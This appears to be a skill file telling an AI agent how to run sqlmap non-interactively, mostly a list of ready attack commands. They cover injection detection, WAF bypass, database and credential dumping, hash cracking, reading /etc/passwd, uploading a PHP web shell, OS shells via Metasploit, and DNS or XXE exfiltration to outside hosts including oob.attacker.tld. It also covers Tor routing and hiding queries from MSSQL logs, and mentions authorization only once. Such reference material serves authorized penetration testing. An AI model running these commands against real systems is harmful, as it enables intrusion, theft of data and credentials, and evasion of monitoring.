---
name: sqlmap
description: sqlmap target syntax, non-interactive execution, and common validation/enumeration workflows.
---

# sqlmap CLI Playbook

Official docs:
- https://github.com/sqlmapproject/sqlmap/wiki/usage
- https://sqlmap.org

Canonical syntax:
`sqlmap -u "<target_url_with_params>" [options]`

High-signal flags:
- `-u, --url <url>` target URL
- `-r <request_file>` raw HTTP request input
- `-p <param>` test specific parameter(s)
- `--batch` non-interactive mode
- `--level <1-5>` test depth
- `--risk <1-3>` payload risk profile
- `--threads <n>` concurrency
- `--technique <letters>` technique selection (default `BEUSTQ`)
- `--forms` parse and test forms from target page
- `--cookie <cookie>` and `--headers <headers>` authenticated context
- `--timeout <seconds>` and `--retries <n>` transport stability
- `--tamper <scripts>` WAF/input-filter evasion
- `--random-agent` randomize user-agent
- `--proxy <url>` route traffic through proxy
- `--ignore-proxy` bypass configured proxy
- `--dbs`, `-D <db> --tables`, `-D <db> -T <table> --columns`, `-D <db> -T <table> -C <cols> --dump`
- `--flush-session` clear cached scan state
- `--proof` prove exploitation of detected injection point(s)

Agent-safe baseline for automation:
`sqlmap -u "https://target.tld/item?id=1" -p id --batch --level 2 --risk 1 --threads 5 --timeout 10 --retries 1 --random-agent`

Common patterns:
- Baseline injection check:
  `sqlmap -u "https://target.tld/item?id=1" -p id --batch --level 2 --risk 1 --threads 5`
- POST parameter testing:
  `sqlmap -u "https://target.tld/login" --data "user=admin&pass=test" -p pass --batch --level 2 --risk 1`
- From saved request (Caido/Burp export):
  `sqlmap -r request.txt -p id --batch --level 2 --risk 1 --threads 5`
- Form-driven testing:
  `sqlmap -u "https://target.tld/login" --forms --batch --level 2 --risk 1 --random-agent`
- OpenAPI-derived testing:
  `sqlmap --openapi https://target.tld/openapi.json --batch --level 2 --risk 1 --random-agent`
- Enumerate DBs:
  `sqlmap -u "https://target.tld/item?id=1" -p id --batch --dbs`
- Enumerate tables in DB:
  `sqlmap -u "https://target.tld/item?id=1" -p id --batch -D appdb --tables`
- Dump selected columns:
  `sqlmap -u "https://target.tld/item?id=1" -p id --batch -D appdb -T users -C id,email,role --dump`
- DNS exfiltration (zero-setup OOB):
  `sqlmap -u "https://target.tld/item?id=1" -p id --batch --dns-domain interactsh`
- HTTP/2 timeless blind injection:
  `sqlmap -u "https://target.tld/item?id=1" -p id --batch --technique T --timeless --http2`
- Proof of exploitation:
  `sqlmap -u "https://target.tld/item?id=1" -p id --batch --proof`
- Non-SQL injection (SSTI):
  `sqlmap -u "https://target.tld/render?tpl=test" -p tpl --batch --ssti`
- WAF bypass with tamper chaining:
  `sqlmap -u "https://target.tld/item?id=1" -p id --batch --tamper space2comment,between,randomcase --random-agent --delay 1`

Critical correctness rules:
- Always include `--batch` in automation to avoid interactive prompts.
- Keep target parameter explicit with `-p` when possible.
- Use `--flush-session` when retesting after request/profile changes.
- Start conservative (`--level 1-2`, `--risk 1`) and escalate only when needed.
- `--risk 3` uses OR-based payloads that can modify data — never use on production without explicit authorization.
- `--dump-all` without `-D/-T/-C` scoping pulls every table — scope narrowly or use `--exclude-sysdbs`.
- OS access flags (`--os-shell`, `--os-pwn`, `--file-write`) require stacked queries support and DBA privileges.
- `--proof` is non-destructive confirmation of exploitability — use it before escalating to enumeration.
- DNS exfiltration with `--dns-domain interactsh` requires outbound DNS from the target; verify with `interactsh-client` first.
- `--timeless` requires HTTP/2 support on the target (`--http2`); it eliminates network jitter but the target's server must multiplex.

Usage rules:
- Keep authenticated context (`--cookie`/`--headers`) aligned with manual validation state.
- Prefer narrow extraction (`-D/-T/-C`) over broad dump-first behavior.
- Use `--proxy http://127.0.0.1:48080` to route through Caido for traffic inspection.
- Do not use `-h`/`--help` during normal execution unless absolutely necessary.

Failure recovery:
- If results conflict with manual testing, rerun with `--flush-session`.
- If blocked by filtering/WAF, reduce `--threads` and test targeted `--tamper` chains.
- If initial detection misses likely injection, increment `--level`/`--risk` gradually.
- If session cookies expire mid-scan, use `--live-cookies` with a browser cookie file or add `--safe-url`/`--safe-freq` to keep the session alive.
- If time-based blind is unreliable over high-latency links, try `--timeless --http2` or switch to `--technique B` (boolean-blind).
- If anti-CSRF tokens block requests, identify the token parameter with `--csrf-token` and the fetch URL with `--csrf-url`.

If uncertain, query web_search with:
`site:github.com/sqlmapproject/sqlmap/wiki/usage sqlmap <flag>`

## Target Input Modes

sqlmap accepts targets from eight sources; pick the one matching the engagement workflow:

- `-u <url>` — single URL with injectable parameters in the query string. The most common entry point.
  `sqlmap -u "https://target.tld/api/item?id=1&cat=2" -p id --batch`
- `-r <file>` — raw HTTP request saved from Caido, Burp, or `hurl --very-verbose`. Preserves headers, cookies, method, body exactly as captured. The most reliable input for complex requests (multipart, JSON bodies, custom headers).
  `sqlmap -r saved_request.txt -p id --batch`
- `--data <string>` — POST body sent with `-u`. Use `--param-del` if the separator is not `&`.
  `sqlmap -u "https://target.tld/login" --data "user=admin&pass=test" -p pass --batch`
- `-l <logfile>` — parse targets from a Burp or WebScarab proxy log file. Use `--scope` to filter URLs by regex.
  `sqlmap -l burp_proxy.log --scope "api/v[12]" --batch --level 2 --risk 1`
- `-m <bulkfile>` — scan multiple URL targets from a text file (one per line). Use `--scope` to filter.
  `sqlmap -m urls.txt --batch --level 2 --risk 1 --threads 5 --results-file results.csv`
- `--openapi <file|url>` — derive targets from an OpenAPI/Swagger specification. Combined with `--openapi-base` for host-less specs and `--openapi-tags` to narrow to specific operation groups.
  `sqlmap --openapi https://target.tld/openapi.json --openapi-tags "users,orders" --batch --level 2 --risk 1`
- `-d <connstring>` — direct database connection (no HTTP). Tests raw SQL. Requires the DBMS Python driver.
  `sqlmap -d "mysql://user:pass@host:3306/appdb" --batch --dbs`
- `-g <dork>` — process Google dork results as targets. Combine with `--gpage` for pagination.
  `sqlmap -g "inurl:item.php?id= site:target.tld" --batch --level 1 --risk 1`
- `-c <inifile>` — load full configuration from an INI file. Use `--save` to create one from a working command line, then replay it.
  `sqlmap -c previous_run.ini --batch`

## Injection Techniques

sqlmap tests six SQL injection technique classes, selected with `--technique` (default `BEUSTQ` = all six). Restrict to relevant techniques to reduce noise and speed up detection.

**B — Boolean-based blind.** Injects conditions that produce a true/false page difference. The workhorse for most modern apps. Fast (binary search: ~7 requests per character for ASCII) but depends on a stable page-diff oracle. Use `--string`/`--not-string` or `--code` to help sqlmap lock on to the true/false signal when page content is unstable. Parallelizes well with `--threads` since each request is independent.

**E — Error-based.** Extracts data from DBMS error messages reflected in the response. Fastest extraction when available (full row per request). Works against verbose error configurations; `--parse-errors` shows raw DBMS errors in output. DBMS-specific error functions: `EXTRACTVALUE`/`UPDATEXML` (MySQL), `CONVERT`/`CAST` (MSSQL), `XMLType` (Oracle), `GET_LOCK` (MySQL). The `--no-escape` flag can help when the error payload's quoting conflicts with the application's own escaping.

**U — Union query-based.** Injects a `UNION SELECT` to append attacker-controlled rows to the result set. Requires knowing or brute-forcing the column count. Second-fastest extraction after error-based. Tune with:
- `--union-cols <range>` — column count range to test (default `1-10`; raise if needed)
- `--union-char <char>` — character for column-count brute force (default `NULL`)
- `--union-from <table>` — table for the `FROM` clause (needed for some DBMS like Oracle)
- `--union-values <values>` — specific column values to use in the `UNION SELECT`

**S — Stacked queries.** Injects a second statement after a semicolon. Required for `--os-shell`, `--os-pwn`, `--file-write`, `--udf-inject`. Not all DBMS/driver combinations support it:
- PostgreSQL: supported via `psycopg2` and native drivers.
- MSSQL: supported via multi-statement execution (most drivers).
- MySQL: only with `mysqlclient` (libmysql) or PDO with `PDO::MYSQL_ATTR_MULTI_STATEMENTS`; NOT with `mysqli` default config.
- Oracle: not supported via standard OCI.
- SQLite: supported.

Detection uses time-based side channels — sqlmap injects `; WAITFOR DELAY` / `; SELECT SLEEP()` and measures the response delay.

**T — Time-based blind.** Injects `SLEEP()`/`WAITFOR DELAY`/`pg_sleep()` and measures response time. The slowest technique (~7 requests × `--time-sec` seconds per character) but works when no other signal is available. Tuning:
- `--time-sec <n>` — delay in seconds (default 5). Lower to 2–3 on fast local targets; raise to 8–10 on high-latency links.
- `--disable-stats` — disable the statistical delay-detection model (use when response times have high natural variance).
- `--timeless` — HTTP/2 timeless timing: sends concurrent multiplexed requests to measure *relative* timing between a conditional and a baseline request, eliminating network jitter. Detects timing differences as small as 100ns. Requires HTTP/2 on the target (`--http2`). Dramatically faster and more reliable than classic time-based blind over high-latency links.
- `--multi-bit` — extract several bits per request using rendered rows with conditional expressions. Reduces request count proportional to the number of bits extracted per request.

**Q — Out-of-band (OOB).** Uses DNS or HTTP exfiltration to extract data through a side channel. Use when the injection point has no inline response and time-based is impractical.
- `--dns-domain <domain>` — DNS exfiltration. sqlmap sends payloads that trigger DNS lookups encoding data in the subdomain label. Point the domain's NS record at the sqlmap host, or use `--dns-domain interactsh` for zero-setup OOB via ProjectDiscovery's interactsh infrastructure.
  `sqlmap -u "https://target.tld/item?id=1" -p id --batch --technique Q --dns-domain interactsh`

**Second-order injection:**
- `--second-url <url>` — URL where the injected payload surfaces (different from the injection point).
- `--second-req <file>` — HTTP request file to fetch the second-order result.

Technique selection patterns:
- Fast detection: `--technique BEU` (skip time-based and stacked/OOB to reduce scan time)
- Exploitation requiring stacked queries: `--technique S` (isolate to confirm stacked support before `--os-shell`)
- Blind-only target: `--technique BT` (boolean + time when no error reflection)
- Quiet/stealth: `--technique B` (boolean-blind only; no time delays, no heavy error reflection)
- Maximum extraction speed: `--technique EU` (error + union; both extract full data inline)
- OOB-only for blind+firewalled: `--technique Q --dns-domain interactsh` (no inline or timing signal)
- Second-order: `--technique BEUSTQ --second-url https://target.tld/result` (injection at one endpoint, response at another)
- Timeless over WAN: `--technique T --timeless --http2` (eliminates jitter over high-latency links)

**Injection context control:**
- `--prefix <string>` — prepend to every payload. Use when you know the SQL context:
  `--prefix "'))"` if injecting into `WHERE id IN((1))`.
- `--suffix <string>` — append to every payload:
  `--suffix "-- -"` to comment out trailing SQL.
- `--dbms <name>` — force back-end DBMS identity (skips DBMS detection; speeds up and narrows payloads).
  Supported: MySQL, PostgreSQL, MSSQL, Oracle, SQLite, IBM DB2, SAP MaxDB, Firebird, Sybase, HSQLDB, H2, Informix, MonetDB, Apache Derby, Vertica, Mckoi, Presto, Altibase, MimerSQL, CrateDB, Cubrid, Cache, eXtremeDB, FrontBase, Raima, Virtuoso.
- `--os <name>` — force back-end OS (affects file paths and OS access commands).
- `--no-cast` — disable `CAST()`/`CONVERT()` in payloads (some DBMS/versions reject them).
- `--no-escape` — disable string escaping (use when the app double-escapes).
- `--invalid-bignum` / `--invalid-logical` / `--invalid-string` — control how sqlmap generates "invalid" values to trigger the false condition. Switch between them when the default invalidation method doesn't produce a clean true/false differential.
- `--esperanto` — DBMS-agnostic enumeration engine. Uses generic SQL constructs that work across DBMS types when the exact DBMS is unknown or unsupported.

## Detection Tuning

**Level** controls which injection points and parameter types sqlmap tests:
- `--level 1` (default) — GET and POST parameters only. Fastest.
- `--level 2` — adds Cookie parameters.
- `--level 3` — adds User-Agent and Referer headers.
- `--level 4` — adds more parameter variations and payloads.
- `--level 5` — maximum: tests all parameter types with the full payload set. Slow.

**Risk** controls how aggressive the payloads are:
- `--risk 1` (default) — safe: only innocuous payloads that don't modify data.
- `--risk 2` — adds heavy time-based payloads.
- `--risk 3` — adds OR-based payloads (`OR 1=1`). **These can modify data** (e.g., `UPDATE ... WHERE 1=1` affects all rows). Never use on production without explicit authorization.

**Oracle tuning** — help sqlmap distinguish true from false responses:
- `--string <text>` — text that appears when the query is true.
- `--not-string <text>` — text that appears when the query is false.
- `--regexp <pattern>` — regex matching the true state.
- `--code <http_code>` — HTTP status code for the true state.
- `--lengths` — compare pages by content length only (ignore content).
- `--text-only` — compare only textual content (strip HTML tags).
- `--titles` — compare only page titles.
- `--smart` — run thorough tests only when heuristics are positive. Reduces noise on large target sets.
- `--skip-heuristics` — skip heuristic detection (go straight to payload testing).
- `--skip-waf` — skip WAF/IPS heuristic detection.

**Injection point filtering:**
- `-p <param>` — test only named parameter(s).
- `--skip <param>` — skip named parameter(s).
- `--skip-static` — skip parameters that don't appear dynamic (value doesn't affect response).
- `--param-exclude <regex>` — exclude parameters matching regex (e.g., `csrf|token|sess`).
- `--param-filter <place>` — test only parameters from a specific place: `GET`, `POST`, `Cookie`, `URI`, `User-Agent`, `Referer`, `Host`, `Custom-POST`, `Custom-Header`.

**Test payload filtering:**
- `--test-filter <text>` — run only tests whose payload title or name matches (e.g., `ROW`, `UNION`, `AND`).
- `--test-skip <text>` — skip tests matching (e.g., `BENCHMARK` to avoid heavy MySQL delay payloads).

Pattern: use `--string` or `--code` when the default page-comparison oracle is unstable (dynamic pages, AJAX, ads).

Escalation workflow:
1. `--level 1 --risk 1` — fast baseline. Tests GET/POST params with safe payloads.
2. If negative: `--level 2 --risk 1` — add cookie testing.
3. If negative: `--level 3 --risk 1` — add header injection points (User-Agent, Referer).
4. If detected but extraction fails: `--risk 2` — heavier time-based payloads.
5. If critical data needed and authorized: `--risk 3` — OR-based payloads (data-modifying risk).

## Tamper Scripts and WAF Bypass

sqlmap ships 80 tamper scripts that transform injection payloads to bypass input filters, WAFs, and server-side sanitization. List available tampers: `sqlmap --list-tampers`.

Chain multiple tampers with commas; they apply in order:
`sqlmap -u "<url>" -p id --batch --tamper space2comment,between,randomcase`

**Space replacement** (bypass space-based WAF rules):
- `space2comment` — `SELECT/**/1` (MySQL, PostgreSQL, MSSQL, generic)
- `space2dash` — `SELECT--\n1` (MySQL)
- `space2hash` — `SELECT#\n1` (MySQL)
- `space2plus` — `SELECT+1` (generic URL context)
- `space2morecomment` — `SELECT/**_**/1` (MySQL nested comments)
- `space2morehash` — extended hash-comment variant (MySQL)
- `space2mssqlblank` — random SQL Server whitespace chars (MSSQL)
- `space2mssqlhash` — `SELECT%23%0A1` (MSSQL)
- `space2mysqlblank` — random MySQL-accepted whitespace chars (MySQL)
- `space2mysqldash` — MySQL dash-comment variant (MySQL)
- `space2randomblank` — random whitespace characters (generic)
- `multiplespaces` — add redundant spaces (generic)

**Encoding** (bypass keyword/pattern filters):
- `charencode` — URL-encode payload characters (generic)
- `chardoubleencode` — double URL-encode (generic)
- `charunicodeencode` — Unicode URL-encode (MSSQL, IIS)
- `charunicodeescape` — Unicode escape sequences (generic)
- `base64encode` — Base64-encode the payload (generic)
- `htmlencode` — HTML-entity encode (generic)
- `hexentities` — hex HTML entities (generic)
- `decentities` — decimal HTML entities (generic)
- `overlongutf8` / `overlongutf8more` — overlong UTF-8 encoding (older WAFs)
- `percentage` — add `%` before each char (MSSQL/IIS)
- `hex2char` — convert hex to `CHAR()` (generic)
- `ord2ascii` — `ORD()` to `ASCII()` (generic)

**Case and comment manipulation**:
- `randomcase` — random upper/lower case on SQL keywords (generic)
- `randomcomments` — insert random comments into SQL keywords (generic)
- `commentbeforeparentheses` — insert `/**/` before parentheses (generic)
- `lowercase` — force lowercase (generic)

**Keyword substitution** (bypass keyword blacklists):
- `between` — replace `=` with `BETWEEN` (generic)
- `equaltolike` — replace `=` with `LIKE` (generic)
- `equaltorlike` — replace `=` with `RLIKE` (MySQL)
- `greatest` — replace `>` with `GREATEST()` (generic)
- `least` — replace `<` with `LEAST()` (generic)
- `concat2concatws` — `CONCAT()` to `CONCAT_WS()` (MySQL)
- `ifnull2casewhenisnull` / `ifnull2ifisnull` — `IFNULL` replacements (MSSQL/MySQL)
- `if2case` — `IF()` to `CASE WHEN` (generic)
- `mid2leftright` / `substring2leftright` — `MID()`/`SUBSTRING()` to `LEFT()`+`RIGHT()` (generic)
- `plus2concat` / `plus2fnconcat` — `+` to `CONCAT()` / `{fn CONCAT()}` (MSSQL)

**DBMS-specific evasion**:
- `modsecurityversioned` / `modsecurityzeroversioned` — MySQL versioned comments to bypass ModSecurity
- `halfversionedmorekeywords` — MySQL half-versioned comments
- `informationschemacomment` / `infoschema2innodb` — `INFORMATION_SCHEMA` obfuscation (MySQL)
- `schemasplit` — split schema references (generic)
- `bluecoat` — replace `LIKE` with `LIKE` after space→%09 (Blue Coat SGOS)
- `luanginx` / `luanginxmore` — Lua/nginx-specific encodings
- `mssqlnosemicolon` — remove semicolons (MSSQL)
- `sp_password` — append `sp_password` to hide from MSSQL logs
- `oraclequote` — Oracle-specific quoting
- `odbcbrace` — ODBC brace notation (generic)
- `dollarquote` — dollar-sign quoting (PostgreSQL)

**Union/value manipulation**:
- `0eunion` — scientific notation for UNION (MySQL)
- `dunion` — `D UNION` variant
- `misunion` — misshapen UNION syntax
- `unionalltounion` — `UNION ALL` to `UNION`
- `uniontable` / `unionvalues` / `unionvaluesrow` — UNION payload variants

**Other**:
- `apostrophemask` / `apostrophenullencode` — mask single quotes
- `appendnullbyte` — append null byte (older parsers)
- `binary` / `blindbinary` — binary payload variants
- `castprefix` — add `CAST()` prefix
- `scientific` / `sign` — scientific notation and sign prefix
- `sleep2getlock` / `sleep2hex` — replace `SLEEP()` with alternatives (MySQL)
- `quote2ltat` — quote replacement
- `symboliclogical` — symbolic logical operators
- `escapequotes` — escape single quotes
- `commalesslimit` / `commalessmid` — comma-less `LIMIT`/`MID()` variants

**Common WAF bypass chains:**
- ModSecurity/OWASP CRS: `--tamper modsecurityversioned,space2comment,between,randomcase`
- Generic cloud WAF: `--tamper charencode,space2comment,randomcase --chunked --random-agent`
- MSSQL behind IIS: `--tamper space2mssqlblank,charunicodeencode,percentage`

**Additional bypass controls:**
- `--hpp` — HTTP parameter pollution: duplicate the injectable parameter to bypass parsers that check only the first/last occurrence.
- `--chunked` — send POST body with chunked transfer encoding; some WAFs don't reassemble chunks before inspection.
- `--skip-urlencode` — send payloads without URL encoding (some backends expect raw input).
- `--prefix <string>` / `--suffix <string>` — custom strings prepended/appended to every payload; use when you know the injection context (e.g., `--prefix "'))" --suffix "-- -"`).
- `--eval <python>` — run Python code before each request to compute dynamic parameters (HMAC signatures, timestamps, derived tokens).
- `--csrf-token <name>` / `--csrf-url <url>` / `--csrf-method <method>` / `--csrf-data <data>` / `--csrf-retries <n>` — handle anti-CSRF tokens automatically; sqlmap fetches a fresh token from `--csrf-url` before each request.

## Enumeration and Data Extraction

Progressive enumeration after confirming injection:

**Reconnaissance:**
- `-b, --banner` — DBMS banner string
- `--current-user` — current database user
- `--current-db` — current database name
- `--hostname` — DBMS server hostname
- `--is-dba` — check if current user has DBA privileges
- `-f, --fingerprint` — extensive DBMS version fingerprint (version, patches, features)

**User and privilege enumeration:**
- `--users` — enumerate all DBMS users
- `--passwords` — enumerate user password hashes (sqlmap auto-cracks with built-in dictionaries; `--disable-hashing` to skip)
- `--privileges` — enumerate user privileges
- `--roles` — enumerate user roles
- `-U <user>` — scope user enumeration to a specific user

**Schema discovery:**
- `--dbs` — list all databases
- `--tables` / `-D <db> --tables` — list tables (optionally scoped to a database)
- `--columns` / `-D <db> -T <table> --columns` — list columns
- `--schema` — dump full schema (all databases, tables, columns)
- `--count` — retrieve row counts per table (fast triage without dumping)
- `--comments` — retrieve column/table comments (useful for understanding schema semantics)
- `--search` — search for specific database/table/column names across the DBMS
  `sqlmap -u "<url>" -p id --batch --search -D "%" -T "user" -C "pass"`
- `--exclude-sysdbs` — skip system databases when enumerating tables
- `--exclude <identifier>` — exclude specific databases/tables from enumeration

**Data extraction:**
- `--dump` — dump table entries (scope with `-D/-T/-C`)
- `--dump-all` — dump all tables in all databases (use `--exclude-sysdbs` to skip system tables)
- `--where <condition>` — apply a `WHERE` clause during dump
  `sqlmap -u "<url>" -p id --batch -D appdb -T users --dump --where "role='admin'"`
- `--start <n>` / `--stop <n>` — retrieve entries in a range (row-based pagination)
- `--first <n>` / `--last <n>` — retrieve character range of output (character-based pagination for blind extraction)
- `--pivot-column <col>` — pivot column for blind enumeration when the default row pivot fails
- `--dump-format <format>` — output format: `CSV` (default), `HTML`, `SQLITE`, `JSONL`
- `--dump-file <path>` — write dumped data to a custom file path
- `--hex` — force hex conversion during data retrieval (avoids encoding issues with binary/non-ASCII data)
- `--charset <chars>` — custom character set for blind brute force (e.g., `0123456789abcdef` for hex values)
- `--binary-fields <fields>` — declare fields with binary values (e.g., `digest,avatar`)

**SQL shell:**
- `--sql-query <statement>` — execute a single SQL statement
  `sqlmap -u "<url>" -p id --batch --sql-query "SELECT version()"`
- `--sql-shell` — interactive SQL shell (not available in `--batch` mode; use `--sql-query` or `--sql-file` instead)
- `--sql-file <path>` — execute SQL statements from a file

**Active enumeration:**
- `--statements` — retrieve SQL statements currently running on the DBMS
- `--procs` — retrieve stored procedures/functions and their source code

**Brute force (timing-based existence checks; useful when `INFORMATION_SCHEMA` is inaccessible):**
- `--common-tables` — check for existence of common table names (e.g., `users`, `accounts`, `orders`, `sessions`)
- `--common-columns` — check for existence of common column names (e.g., `password`, `email`, `token`, `secret`)
- `--common-files` — check for existence of common files accessible via DBMS file-read functions (e.g., `/etc/passwd`, `web.config`, `.env`)

**Enumeration workflow (progressive depth):**
1. `--banner --current-user --current-db --is-dba` — fingerprint and assess privilege.
2. `--dbs` — list databases.
3. `-D <db> --tables` → `-D <db> -T <table> --columns` → `-D <db> -T <table> --count` — drill into interesting databases.
4. `-D <db> -T <table> -C <cols> --dump --where "<condition>"` — extract specific data.
5. `--search -C password,secret,token,api_key` — hunt for credential columns across all databases.
6. `--passwords` — extract and auto-crack password hashes.

## OS and File System Access

These capabilities escalate from SQL injection to operating system access. All require confirmed injection, and most need stacked queries (`--technique S`) and DBA privileges (`--is-dba`).

**Command execution:**
- `--os-cmd <command>` — execute a single OS command and return its output.
  `sqlmap -u "<url>" -p id --batch --os-cmd "id"`
- `--os-shell` — interactive OS shell via the injection point. Mechanism varies by DBMS:
  - MSSQL: enables `xp_cmdshell` (re-enables it if disabled; requires sysadmin role).
  - MySQL: uploads a UDF shared library (`lib_mysqludf_sys.so`/`.dll`) via `INTO DUMPFILE`, then calls `sys_exec()`. Requires FILE privilege and a writable plugin directory.
  - PostgreSQL: uses `COPY TO/FROM PROGRAM` (9.3+) or creates a `plpython3u`/`plperlu` function. Requires superuser.
  - SQLite: not supported (no OS access surface).

  Requires stacked queries for MSSQL and MySQL; PostgreSQL can use `COPY ... PROGRAM` without stacked queries in some configurations.

**Out-of-band shell:**
- `--os-pwn` — OOB shell using Metasploit. Spawns a Meterpreter session or VNC connection. Requires `--msf-path` pointing to the Metasploit installation.
- `--os-smbrelay` — one-click OOB shell via SMB relay (Windows targets only).
- `--os-bof` — exploit stored procedure buffer overflow (MSSQL `sp_replwritetovarbin` on unpatched systems).
- `--priv-esc` — attempt privilege escalation from the database process user.
- `--msf-path <path>` — Metasploit installation path (for `--os-pwn`).
- `--tmp-path <path>` — remote temporary directory for payload staging.

**File system access:**
- `--file-read <remote_path>` — read a file from the DBMS server's file system.
  `sqlmap -u "<url>" -p id --batch --file-read "/etc/passwd"`
- `--file-write <local_path>` / `--file-dest <remote_path>` — upload a local file to the server.
  `sqlmap -u "<url>" -p id --batch --file-write shell.php --file-dest /var/www/html/shell.php`
  Requires stacked queries and appropriate filesystem permissions from the DBMS user.

**UDF injection (MySQL/PostgreSQL):**
- `--udf-inject` — inject custom user-defined functions compiled as a shared library.
- `--shared-lib <path>` — local path to the `.so`/`.dll` to upload and register.

**Windows registry (MSSQL with xp_regread):**
- `--reg-read` / `--reg-add` / `--reg-del` — read, write, delete registry keys.
- `--reg-key <key>` / `--reg-value <name>` / `--reg-data <data>` / `--reg-type <type>` — specify the registry target.

**Cleanup:**
- `--cleanup` — remove sqlmap-created UDFs, temporary tables, and uploaded files from the DBMS after exploitation.

Precondition checklist:
1. Confirm injection: `--proof` first.
2. Check stacked query support: `--technique S --batch` (if detection succeeds, stacked queries work).
3. Check DBA: `--is-dba`.
4. Identify DBMS: `--fingerprint` (determines which OS access technique sqlmap uses).
5. Identify web root: `--web-root` if uploading shells.

## Non-SQL Injection Types

sqlmap 1.10+ extends beyond SQL injection to test 11 additional injection types. Each is activated by its own flag and uses sqlmap's request/transport/session infrastructure.

- `--graphql` — test GraphQL query parameters for injection.
- `--ldap` — test for LDAP injection in search filter parameters.
- `--nosql` — test for NoSQL injection (MongoDB query operator injection, JavaScript injection).
- `--xpath` — test for XPath injection in XML/XPath query parameters.
- `--ssti` — test for server-side template injection (Jinja2, Twig, Freemarker, etc.).
- `--xslt` — test for XSLT injection.
- `--xxe` — test for XML External Entity injection.
  - `--oob-server <url>` — out-of-band server for blind XXE (receives exfiltrated data).
  - `--oob-token <token>` — authentication token for a self-hosted OOB server.
- `--hql` — test for HQL/JPQL injection (Hibernate ORM).
- `--sparql` — test for SPARQL injection (RDF/graph databases).
- `--odata` — test for OData `$filter` injection.
- `--jwt` — audit JSON Web Tokens for weaknesses (algorithm confusion, weak secrets, claim manipulation).

These flags work with the standard request infrastructure (`-u`, `-r`, `--data`, `--cookie`, `--headers`, `--proxy`, `--tamper`, etc.) and obey `--batch`, `--level`, `--risk`.

These are detection engines, not full exploitation suites — they confirm the injection class exists and demonstrate basic data extraction. For deep exploitation, use the findings to pivot into class-specific tools or manual techniques documented in the corresponding vulnerability skill.

Pattern: combine with the base SQL injection test or run standalone:
`sqlmap -u "https://target.tld/api/query" --data '{"query":"{ user(id:1) { name } }"}' --batch --graphql`
`sqlmap -u "https://target.tld/search?filter=admin" -p filter --batch --ldap`
`sqlmap -u "https://target.tld/render?tpl=hello" -p tpl --batch --ssti`
`sqlmap -u "https://target.tld/api/data" --data '<xml><item>test</item></xml>' --batch --xxe --oob-server https://oob.attacker.tld`
`sqlmap -r jwt_request.txt --batch --jwt`
`sqlmap -u "https://target.tld/odata/Users?\$filter=Name+eq+'admin'" -p "\$filter" --batch --odata`

Route to the vulnerability skill for the class being tested (see Chaining and Routing).

## Request and Transport Control

**Authentication:**
- `--auth-type <type>` — HTTP auth type: `Basic`, `Digest`, `Bearer`, `NTLM`.
- `--auth-cred <user:pass>` — credentials for HTTP auth.
- `--auth-file <pem>` — PEM cert/key for client certificate auth.
- `--cookie <value>` — session cookie. Keep aligned with the authenticated session.
- `--live-cookies <file>` — read cookies from a live browser cookie file (auto-refreshes).
- `--load-cookies <file>` — load cookies in Netscape/wget format.
- `--drop-set-cookie` — ignore `Set-Cookie` from responses (keep the original session).

**Proxy and routing:**
- `--proxy <url>` — HTTP/SOCKS proxy (`http://127.0.0.1:48080` for Caido).
- `--proxy-cred <user:pass>` — proxy authentication.
- `--proxy-file <file>` — rotate through a list of proxies.
- `--proxy-freq <n>` — change proxy every N requests.
- `--tor` / `--tor-port <port>` / `--tor-type <type>` — route through Tor (default SOCKS5). `--check-tor` verifies Tor is working.
- `--ignore-proxy` — bypass system proxy settings.

**Rate and timing:**
- `--delay <seconds>` — delay between requests (float; e.g., `0.5`).
- `--timeout <seconds>` — connection timeout (default 30).
- `--retries <n>` — retries on timeout (default 3).
- `--retry-on <regex>` — retry when response body matches regex.
- `--threads <n>` — concurrent requests (default 1; max useful is ~10).
- `--safe-url <url>` / `--safe-post <data>` / `--safe-req <file>` / `--safe-freq <n>` — visit a "safe" URL every N requests to keep the session alive or avoid rate-limit lockout.
- `--time-limit <seconds>` — abort the run after a time limit.

**Request manipulation:**
- `-X <method>` — force HTTP method (PUT, PATCH, DELETE).
- `-H <header>` — add extra header (repeatable).
- `--headers <multiline>` — multiple extra headers (newline-separated).
- `--host <value>` — override Host header.
- `--referer <value>` — set Referer header.
- `-A <agent>` — set specific User-Agent.
- `--mobile` — imitate a smartphone User-Agent.
- `--random-agent` — randomize User-Agent per request.
- `--randomize <param>` — randomize a specific parameter's value per request (anti-caching).
- `--force-ssl` — force HTTPS.
- `--http1.0` — use HTTP/1.0.
- `--http2` — use HTTP/2.
- `--param-del <char>` — custom parameter delimiter (default `&`).
- `--cookie-del <char>` — custom cookie delimiter (default `;`).
- `--skip-urlencode` — skip URL encoding of payloads.
- `--skip-xmlencode` — skip safe encoding for SOAP/XML payloads.
- `--eval <python>` — execute Python code before each request. Useful for computing HMAC signatures, timestamps, or derived tokens:
  `sqlmap -u "<url>?id=1&ts=0&sig=0" --eval "import hashlib,time;ts=str(int(time.time()));sig=hashlib.sha256(('id1'+ts).encode()).hexdigest()" --batch`
- `--preprocess <script>` — run a Python script on each request before sending.
- `--postprocess <script>` — run a Python script on each response after receiving.
- `--base64 <params>` — declare parameters that contain Base64-encoded data (sqlmap decodes, injects, re-encodes).
- `--base64-safe` — use URL-safe Base64 alphabet (RFC 4648).

**Optimization:**
- `-o` — turn on all optimization switches (keep-alive, null-connection, threads).
- `--no-keep-alive` — disable persistent connections.
- `--null-connection` — retrieve page length without the full response body (fast boolean-blind).

## Session Management and Reporting

**Session persistence:**
- sqlmap auto-saves session state to `~/.local/share/sqlmap/output/<target>/session.sqlite`. Subsequent runs against the same target resume from cached state.
- `-s <file>` — load session from a specific `.sqlite` file.
- `--flush-session` — clear cached state and start fresh. Use after changing request parameters, authentication, or tamper scripts.
- `--fresh-queries` — ignore cached query results but keep injection point data.
- `--offline` — work entirely from cached session data (no network).

**Non-interactive control:**
- `--batch` — auto-accept all prompts with defaults.
- `--answers <pairs>` — pre-define answers: `--answers "quit=N,follow=N,keep=Y"`.
- `-z <mnemonics>` — short flag mnemonics: `-z "flu,bat,ban,tec=EU"` = `--flush-session --batch --banner --technique EU`.

**Traffic logging:**
- `-t <file>` — log all HTTP traffic to a text file.
- `--har <file>` — log all traffic in HAR format (importable into Caido/Burp/browser devtools).
- `-v 4` — show HTTP requests in console. `-v 5` — show requests and responses. `-v 6` — show full headers and body.

**Reporting:**
- `--report-json <file>` — write structured run results to a JSON file.
- `--dump-format <format>` — output format for `--dump`: `CSV` (default), `HTML`, `SQLITE`, `JSONL`.
- `--dump-file <path>` — custom output file for dumped data.
- `--output-dir <dir>` — custom output directory (default `~/.local/share/sqlmap/output/`).
